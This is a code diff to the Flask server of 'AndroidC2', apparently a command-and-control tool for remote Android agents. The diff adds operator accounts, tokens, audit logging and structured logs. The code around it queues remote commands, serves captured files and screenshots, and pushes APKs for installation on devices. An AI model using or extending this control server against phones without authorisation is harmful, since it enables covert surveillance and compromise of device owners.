@@ -1,11 +1,13 @@
 """AndroidC2 — main entry point."""
 
 import os
+import secrets
 import shutil
 from pathlib import Path
 
 from flask import (
     Flask,
+    g,
     jsonify,
     redirect,
     render_template,
@@ -24,6 +26,10 @@ from c2.agent_ws import (
     register_agent_ws,
     send_command_to_agent,
 )
+from c2 import audit
+from c2 import logs
+from c2 import operators as ops
+from c2.operators_cli import register as register_operator_cli
 from c2.auth import (
     blocked_for,
     clear_failures,
@@ -31,17 +37,81 @@ from c2.auth import (
     csrf_token,
     is_authenticated,
     key_fingerprint,
+    token_operator,
     operator_required,
     record_failure,
-    verify_password,
 )
-from c2.command_builder import COMMAND_CATALOG, build_command
+from c2.command_builder import (
+    COMMAND_CATALOG,
+    COMMAND_GROUPS,
+    UnsupportedOnDevice,
+    build_command,
+    catalog_for,
+    coverage,
+)
 from c2.file_handler import delete_device_files, verify_stored_path
 from c2.reaper import start_reaper
 from c2.timeutil import utcnow
 from c2.ws_dashboard import broadcast, init_socketio, socketio
 from database import db, init_db
-from models import CapturedFile, Command, Device, LogEntry
+from models import (
+    CapturedFile,
+    Command,
+    Device,
+    LogEntry,
+    Operator,
+    OperatorAction,
+)
+
+
+_VALID_REQUEST_ID = __import__("re").compile(r"^[A-Za-z0-9_.:-]{1,64}$")
+
+
+def _valid_request_id(value: str) -> bool:
+    return bool(value) and bool(_VALID_REQUEST_ID.match(value))
+
+
+def _safe_next(candidate: str | None) -> str:
+    """Only ever redirect to a local path."""
+    if not candidate:
+        return "/"
+    if not candidate.startswith("/") or candidate.startswith("//"):
+        return "/"
+    return candidate
+
+
+def _parse_iso(value: str):
+    from datetime import datetime
+
+    return datetime.fromisoformat(value.replace("Z", ""))
+
+
+def audit_blocked_for() -> float:
+    from c2.auth import blocked_for
+
+    return blocked_for()
+
+
+def _bootstrap_operator(app, log) -> None:
+    """Make sure at least one operator exists.
+
+    Kept idempotent: once the table is populated the environment variables
+    are ignored, so rotating C2_OPERATOR_PASSWORD never silently changes an
+    existing account. Use the CLI to add or change operators after that.
+    """
+    with app.app_context():
+        action, row = ops.ensure_bootstrap(
+            Config.OPERATOR_NAME, Config.OPERATOR_PASSWORD)
+        if action == "created":
+            logs.log(log, "info", "operator.bootstrap",
+                     name=row.name, role=row.role,
+                     token_fp=row.token_fingerprint(),
+                     note="set C2_OPERATOR_NAME/PASSWORD only applies "
+                          "while the operator table is empty")
+        elif action == "skipped":
+            logs.log(log, "warn", "operator.none",
+                     note="no operators exist and no password was supplied; "
+                          "run `flask --app app operators` to create one")
 
 
 def _migrate_legacy_uploads(app) -> int:
@@ -92,7 +162,8 @@ def _migrate_legacy_uploads(app) -> int:
         except OSError:
             pass
 
-    print(f"[startup] migrated {moved} captured file(s) to {target}", flush=True)
+    logs.log(logs.get_logger("c2.app"), "info", "uploads.migrated",
+             moved=moved, target=str(target))
     return moved
 
 
@@ -100,64 +171,230 @@ def create_app(start_background: bool = True):
     app = Flask(__name__, static_folder="static", template_folder="templates")
     app.config.from_object(Config)
 
+    logger = logs.configure(
+        level=Config.LOG_LEVEL,
+        fmt=Config.LOG_FORMAT,
+        secrets=[Config.API_KEY, Config.OPERATOR_PASSWORD, Config.SECRET_KEY],
+    )
+    log = logs.get_logger("c2.app")
+
     os.makedirs(Config.UPLOAD_FOLDER, exist_ok=True)
     os.makedirs(os.path.join(Config.UPLOAD_FOLDER, "to_agent"), exist_ok=True)
 
     init_db(app)
+    if Config.AUTH_MODE == "operator":
+        _bootstrap_operator(app, log)
     _migrate_legacy_uploads(app)
 
     init_socketio(app)
     app.register_blueprint(agent_api)
     register_agent_ws()
+    register_operator_cli(app)
+
+    # ------------------------------------------------------ observability
+
+    @app.before_request
+    def _assign_request_id():
+        rid = None
+        if Config.TRUST_PROXY_REQUEST_ID:
+            supplied = request.headers.get(logs.REQUEST_ID_HEADER, "")
+            if _valid_request_id(supplied):
+                rid = supplied
+        rid = rid or logs.new_request_id()
+        g.request_id = rid
+        logs.set_request_id(rid)
+        g.started_ms = logs.now_ms()
+
+    @app.after_request
+    def _log_request(response):
+        rid = g.get("request_id") or logs.get_request_id()
+        if rid:
+            response.headers[logs.REQUEST_ID_HEADER] = rid
+        elapsed = logs.now_ms() - g.get("started_ms", logs.now_ms())
+        # Skip the dashboard's high-frequency polling chatter.
+        if request.path.startswith("/api/") or request.path == "/login":
+            logs.log(logs.get_logger("c2.http"), "info", "http.request",
+                     method=request.method, path=request.path,
+                     status=response.status_code, ms=elapsed,
+                     ip=request.remote_addr)
+        return response
+
+    @app.teardown_request
+    def _clear_request_context(_exc=None):
+        # Threads are reused, and a contextvar left set here would bleed the
+        # previous request's id into the next one served by the same thread.
+        logs.set_request_id(None)
+        logs.unbind_all()
+        g.pop("request_id", None)
+        g.pop("started_ms", None)
+
+    @app.errorhandler(Exception)
+    def _log_unhandled(exc):
+        from werkzeug.exceptions import HTTPException
+
+        if isinstance(exc, HTTPException):
+            return exc
+
+        logs.log(logs.get_logger("c2.app"), "error", "http.unhandled",
+                 path=request.path, error=type(exc).__name__)
+        app.logger.exception("unhandled error on %s", request.path)
+        if app.config.get("TESTING") or app.config.get("PROPAGATE_EXCEPTIONS"):
+            raise exc
+        return jsonify({"error": "internal"}), 500
 
     # ---------------------------------------------------------------- auth
 
     @app.route("/login", methods=["GET", "POST"])
     def login():
+        if Config.AUTH_MODE != "operator":
+            return redirect(url_for("index"))
         if request.method == "POST":
             remaining = blocked_for()
             if remaining > 0:
+                audit.record("auth.login_throttled", outcome="denied",
+                             detail={"retry_after": round(remaining, 1)})
+                db.session.commit()
                 return render_template(
                     "login.html",
                     error=f"too many attempts — retry in {int(remaining)}s",
+                    name=request.form.get("name", ""),
                 ), 429
 
-            if verify_password(request.form.get("password", "")):
-                clear_failures()
-                session.clear()
-                session["operator"] = True
-                session.permanent = True
-                csrf_token()
-                nxt = request.form.get("next") or url_for("index")
-                if not nxt.startswith("/") or nxt.startswith("//"):
-                    nxt = url_for("index")
-                return redirect(nxt)
+            name = (request.form.get("name") or "").strip()
+            try:
+                row = ops.verify_password(name, request.form.get("password", ""))
+            except ops.AuthError:
+                record_failure()
+                audit.record("auth.login_fail", outcome="denied",
+                             detail={"name": name,
+                                     "remaining_block": round(audit_blocked_for(), 1)})
+                db.session.commit()
+                return render_template(
+                    "login.html", error="invalid name or password", name=name,
+                ), 401
 
-            record_failure()
-            return render_template("login.html", error="wrong password"), 401
+            clear_failures()
+            session.clear()
+            session["operator"] = True
+            session["operator_id"] = row.name
+            session["operator_name"] = row.name
+            session["operator_role"] = row.role
+            session["sid"] = secrets.token_urlsafe(8)
+            session.permanent = True
+            csrf_token()
+            ops.touch_login(row, request.remote_addr)
+            audit.record("auth.login_ok",
+                         detail={"next": _safe_next(request.form.get("next")),
+                                 "role": row.role})
+            db.session.commit()
+            return redirect(_safe_next(request.form.get("next")))
 
         if is_authenticated():
             return redirect(url_for("index"))
-        return render_template("login.html", error=None)
+        return render_template("login.html", error=None,
+                               name=request.args.get("name", ""))
+
+    # ------------------------------------------------- machine-token auth
+
+    @app.route("/api/operators/me")
+    @operator_required
+    def api_operator_me():
+        if Config.AUTH_MODE != "operator":
+            return jsonify({"auth": Config.AUTH_MODE,
+                            "name": Config.OPERATOR_NAME,
+                            "role": "admin",
+                            "disabled": False,
+                            "has_token": False,
+                            "token_fp": None})
+        """Who this request acts as, and by which credential kind."""
+        name = session.get("operator_name")
+        if name:
+            return jsonify({"auth": "session", **ops.require(name).to_dict()})
+        return jsonify({"auth": "token", **token_operator().to_dict()})
+
+    @app.route("/api/operators")
+    @operator_required
+    def api_operators():
+        """List operators. Tokens appear as fingerprints, never in full."""
+        if Config.AUTH_MODE != "operator":
+            return jsonify([])
+        rows = Operator.query.order_by(Operator.name.asc()).all()
+        return jsonify([r.to_dict() for r in rows])
+
+    @app.route("/api/operators", methods=["POST"])
+    @operator_required
+    @csrf_protect
+    def api_create_operator():
+        body = request.get_json(silent=True) or {}
+        try:
+            row, token = ops.create_operator(
+                name=str(body.get("name", "")).strip(),
+                password=str(body.get("password", "")),
+                role=str(body.get("role", "admin")),
+            )
+        except ops.AuthError as exc:
+            return jsonify({"error": str(exc)}), 400
+
+        audit.record("operator.create",
+                     detail={"name": row.name, "role": row.role})
+        db.session.commit()
+        # The only moment the plaintext token exists in a response.
+        return jsonify({**row.to_dict(), "token": token}), 201
+
+    @app.route("/api/operators/<name>/token", methods=["POST"])
+    @operator_required
+    @csrf_protect
+    def api_rotate_token(name):
+        if Config.AUTH_MODE != "operator":
+            return jsonify({"error": "operators require C2_AUTH=operator"}), 400
+        try:
+            row, token = ops.issue_token(name)
+        except ops.AuthError as exc:
+            return jsonify({"error": str(exc)}), 404
+        audit.record("operator.token_rotate", detail={"name": row.name})
+        db.session.commit()
+        return jsonify({**row.to_dict(), "token": token})
+
+    @app.route("/api/operators/<name>/token", methods=["DELETE"])
+    @operator_required
+    @csrf_protect
+    def api_revoke_token(name):
+        if Config.AUTH_MODE != "operator":
+            return jsonify({"error": "operators require C2_AUTH=operator"}), 400
+        try:
+            row = ops.revoke_token(name)
+        except ops.AuthError as exc:
+            return jsonify({"error": str(exc)}), 404
+        audit.record("operator.token_revoke", detail={"name": row.name})
+        db.session.commit()
+        return jsonify(row.to_dict())
 
     @app.route("/logout", methods=["POST"])
     @operator_required
     @csrf_protect
     def logout():
+        audit.record("auth.logout")
+        db.session.commit()
         session.clear()
         return redirect(url_for("login"))
 
     @app.route("/api/session")
     @operator_required
     def api_session():
-        return jsonify({"authenticated": True, "csrf_token": csrf_token()})
+        from c2.auth import auth_status
+
+        return jsonify(auth_status())
 
     # ------------------------------------------------------------------ ui
 
     @app.route("/")
     @operator_required
     def index():
-        return render_template("index.html", csrf_token=csrf_token())
+        return render_template(
+            "index.html",
+            csrf_token=csrf_token() if Config.AUTH_MODE == "operator" else "",
+            auth_mode=Config.AUTH_MODE,
+        )
 
     # ------------------------------------------------------------- devices
 
@@ -187,6 +424,10 @@ def create_app(start_background: bool = True):
         dev = db.get_or_404(Device, dev_id)
         # Rows go with the cascade; the bytes on disk need removing too.
         freed = delete_device_files(dev)
+        audit.record("device.delete", device=dev,
+                     detail={"bytes_freed": freed,
+                             "commands": dev.commands.count(),
+                             "files": dev.files.count()})
         db.session.delete(dev)
         db.session.commit()
         broadcast("device_removed", {"id": dev_id})
@@ -199,6 +440,8 @@ def create_app(start_background: bool = True):
         dev = db.get_or_404(Device, dev_id)
         body = request.get_json(silent=True) or {}
         dev.notes = str(body.get("notes", ""))[:8000]
+        audit.record("device.notes", device=dev,
+                     detail={"chars": len(dev.notes)})
         db.session.commit()
         return jsonify({"ok": True})
 
@@ -213,6 +456,7 @@ def create_app(start_background: bool = True):
             tags = [str(tags)]
         cleaned = [str(t).strip()[:32] for t in tags if str(t).strip()][:16]
         dev.tags = ",".join(cleaned)
+        audit.record("device.tags", device=dev, detail={"tags": cleaned})
         db.session.commit()
         return jsonify(dev.to_dict())
 
@@ -235,7 +479,17 @@ def create_app(start_background: bool = True):
         if ctype not in COMMAND_CATALOG:
             return jsonify({"error": "unknown_command"}), 400
 
-        cmd = build_command(dev, ctype, args)
+        try:
+            cmd = build_command(dev, ctype, args)
+        except UnsupportedOnDevice as exc:
+            # The device told us it does not implement this. Say so plainly
+            # instead of queueing a command that will bounce.
+            audit.record("command.rejected", device=dev, outcome="denied",
+                         detail={"type": ctype, "reason": "unsupported_on_device"})
+            db.session.commit()
+            return jsonify({"error": "unsupported_on_device",
+                            "detail": str(exc),
+                            "coverage": coverage(dev)}), 409
         pushed = send_command_to_agent(dev.device_id, {
             "id": cmd.id,
             "type": cmd.command_type,
@@ -245,6 +499,10 @@ def create_app(start_background: bool = True):
             cmd.status = "sent"
             cmd.delivered_at = utcnow()
             db.session.commit()
+
+        audit.record("command.queue", device=dev, command=cmd,
+                     detail={"pushed": pushed, "args": cmd.args()})
+        db.session.commit()
 
         broadcast("new_command", cmd.to_dict())
         return jsonify({"id": cmd.id, "pushed": pushed, "status": cmd.status})
@@ -265,7 +523,26 @@ def create_app(start_background: bool = True):
     @app.route("/api/catalog")
     @operator_required
     def api_catalog():
-        return jsonify(COMMAND_CATALOG)
+        """Catalogue, optionally narrowed to what one device can accept.
+
+        /api/catalog                 → everything
+        /api/catalog?device_id=7     → only what device 7 implements
+        """
+        raw = request.args.get("device_id")
+        if raw is None or not raw.isdigit():
+            return jsonify({
+                "commands": COMMAND_CATALOG,
+                "groups": [{"id": gid, "label": label}
+                           for gid, label in COMMAND_GROUPS],
+            })
+
+        dev = db.get_or_404(Device, int(raw))
+        return jsonify({
+            "commands": catalog_for(dev),
+            "groups": [{"id": gid, "label": label}
+                       for gid, label in COMMAND_GROUPS],
+            "coverage": coverage(dev),
+        })
 
     # --------------------------------------------------------------- files
 
@@ -289,6 +566,10 @@ def create_app(start_background: bool = True):
         safe, err = _stored_or_404(cf)
         if err:
             return err
+        audit.record("file.view", device=cf.device,
+                     detail={"file_id": cf.id, "filename": cf.filename,
+                             "bytes": cf.size_bytes})
+        db.session.commit()
         return send_file(safe, as_attachment=False,
                          download_name=cf.filename, mimetype=cf.mime_type)
 
@@ -299,6 +580,10 @@ def create_app(start_background: bool = True):
         safe, err = _stored_or_404(cf)
         if err:
             return err
+        audit.record("file.download", device=cf.device,
+                     detail={"file_id": cf.id, "filename": cf.filename,
+                             "bytes": cf.size_bytes})
+        db.session.commit()
         return send_file(safe, as_attachment=True, download_name=cf.filename)
 
     @app.route("/api/device/<int:dev_id>/latest-screenshot")
@@ -331,6 +616,9 @@ def create_app(start_background: bool = True):
         f.save(dest)
 
         cmd = build_command(dev, "install_apk", {"path": dest})
+        audit.record("file.push", device=dev, command=cmd,
+                     detail={"filename": f.filename, "bytes": os.path.getsize(dest)})
+        db.session.commit()
         return jsonify(cmd.to_dict())
 
     # ---------------------------------------------------------------- logs
@@ -341,6 +629,80 @@ def create_app(start_background: bool = True):
         logs = (LogEntry.query.filter_by(device_id=dev_id)
                 .order_by(LogEntry.created_at.desc()).limit(500).all())
         return jsonify([l.to_dict() for l in logs])
+
+    # --------------------------------------------------------------- audit
+
+    @app.route("/api/audit")
+    @operator_required
+    def api_audit():
+        """Read-only operator action log.
+
+        Deliberately GET-only: there is no route that mutates or deletes an
+        entry, and no filter can be combined into one that can.
+        """
+        query = OperatorAction.query
+
+        actor_filter = request.args.get("actor")
+        if actor_filter:
+            query = query.filter(OperatorAction.actor == actor_filter)
+
+        action_filter = request.args.get("action")
+        if action_filter:
+            query = query.filter(OperatorAction.action == action_filter)
+
+        if request.args.get("outcome"):
+            query = query.filter(OperatorAction.outcome == request.args["outcome"])
+
+        device_filter = request.args.get("device_id")
+        if device_filter:
+            query = query.filter(OperatorAction.device_id == device_filter)
+
+        since = request.args.get("since")
+        if since:
+            try:
+                query = query.filter(OperatorAction.created_at >= _parse_iso(since))
+            except ValueError:
+                return jsonify({"error": "bad_since"}), 400
+
+        try:
+            limit = min(max(int(request.args.get("limit", 100)), 1), 500)
+        except ValueError:
+            return jsonify({"error": "bad_limit"}), 400
+        try:
+            offset = max(int(request.args.get("offset", 0)), 0)
+        except ValueError:
+            return jsonify({"error": "bad_offset"}), 400
+
+        total = query.count()
+        rows = (query.order_by(OperatorAction.id.desc())
+                    .limit(limit).offset(offset).all())
+
+        return jsonify({
+            "entries": [r.to_dict() for r in rows],
+            "total": total,
+            "limit": limit,
+            "offset": offset,
+        })
+
+    @app.route("/api/audit/verify")
+    @operator_required
+    def api_audit_verify():
+        """Recompute the digest chain and report the first mismatch."""
+        result = audit.verify_chain(limit=1000)
+        return jsonify(result), (200 if result["ok"] else 409)
+
+    @app.route("/api/audit/actions")
+    @operator_required
+    def api_audit_actions():
+        """Distinct action names present in the log, for filter UIs."""
+        rows = (db.session.query(OperatorAction.action)
+                .distinct().order_by(OperatorAction.action).all())
+        actors = (db.session.query(OperatorAction.actor)
+                  .distinct().order_by(OperatorAction.actor).all())
+        return jsonify({
+            "actions": [r[0] for r in rows],
+            "actors": [r[0] for r in actors],
+        })
 
     # -------------------------------------------------------------- errors
 
@@ -369,22 +731,63 @@ def create_app(start_background: bool = True):
 
 
 def _startup_banner():
+    """Structured summary of how this process is configured.
+
+    Configures logging first if it is not already set up: the banner used to
+    run before create_app(), which meant its line was emitted before a handler
+    existed and was silently dropped.
+
+    The operator password is never printed: the old banner did, which put a
+    live credential in journald. Read it from
+    data/c2_operator_password.secret instead.
+    """
+    import logging
+
+    if not logging.getLogger("c2").handlers:
+        logs.configure(level=Config.LOG_LEVEL, fmt=Config.LOG_FORMAT,
+                       secrets=[Config.API_KEY, Config.OPERATOR_PASSWORD,
+                                Config.SECRET_KEY])
+
+    from c2.auth import TRUSTED_PROXY
+
     from_env = bool(os.environ.get("C2_OPERATOR_PASSWORD"))
-    print("=" * 58, flush=True)
-    print(" AndroidC2 control server", flush=True)
-    print(f" listening   http://{Config.C2_HOST}:{Config.C2_PORT}", flush=True)
-    print(f" uploads     {Config.UPLOAD_FOLDER}", flush=True)
-    print(f" database    {Config.SQLALCHEMY_DATABASE_URI}", flush=True)
-    print(f" api key     {key_fingerprint(Config.API_KEY)}  "
-          f"({len(Config.API_KEY)} chars, sha256/8)", flush=True)
-    print("             agents must be built with this exact value", flush=True)
-    if from_env:
-        print(" operator    password from C2_OPERATOR_PASSWORD", flush=True)
-    else:
-        print(f" operator    {Config.OPERATOR_PASSWORD}", flush=True)
-        print(f"             (persisted at {Path(Config.UPLOAD_FOLDER).parent}/"
-              "c2_operator_password.secret)", flush=True)
-    print("=" * 58, flush=True)
+    logs.log(logs.get_logger("c2.startup"), "info", "server.starting",
+             host=Config.C2_HOST, port=Config.C2_PORT,
+             uploads=Config.UPLOAD_FOLDER,
+             database=Config.SQLALCHEMY_DATABASE_URI,
+             log_format=Config.LOG_FORMAT,
+             log_level=Config.LOG_LEVEL,
+             auth_mode=Config.AUTH_MODE,
+             access_token_set=bool(Config.ACCESS_TOKEN),
+             trusted_proxy=bool(TRUSTED_PROXY),
+             api_key_fp=key_fingerprint(Config.API_KEY),
+             api_key_len=len(Config.API_KEY),
+             operator_from_env=from_env,
+             heartbeat_timeout=Config.AGENT_HEARTBEAT_TIMEOUT)
+
+    warn = logs.get_logger("c2.startup")
+
+    if Config.AUTH_MODE == "open" and Config.C2_HOST not in ("127.0.0.1", "localhost"):
+        logs.log(warn, "warn", "auth.unsafe_binding",
+                 host=Config.C2_HOST,
+                 note="C2_AUTH=open while bound to a non-loopback address; "
+                      "set C2_AUTH=token or bind to 127.0.0.1")
+
+    if Config.AUTH_MODE == "token":
+        if not Config.ACCESS_TOKEN:
+            logs.log(warn, "error", "auth.token_missing",
+                     note="C2_AUTH=token but C2_ACCESS_TOKEN is empty; "
+                          "every remote request will be refused")
+        if not TRUSTED_PROXY:
+            logs.log(warn, "warn", "auth.proxy_untrusted",
+                     note="tunnel or reverse proxy requests arrive as "
+                          "127.0.0.1 and would be treated as local; "
+                          "set C2_TRUSTED_PROXY=127.0.0.1")
+
+    if Config.AUTH_MODE == "operator" and Config.C2_HOST == "127.0.0.1":
+        logs.log(warn, "info", "auth.operator_mode",
+                 note="loopback only — set C2_HOST=0.0.0.0 behind a "
+                      "reverse proxy if you need remote access")
 
 
 if __name__ == "__main__":
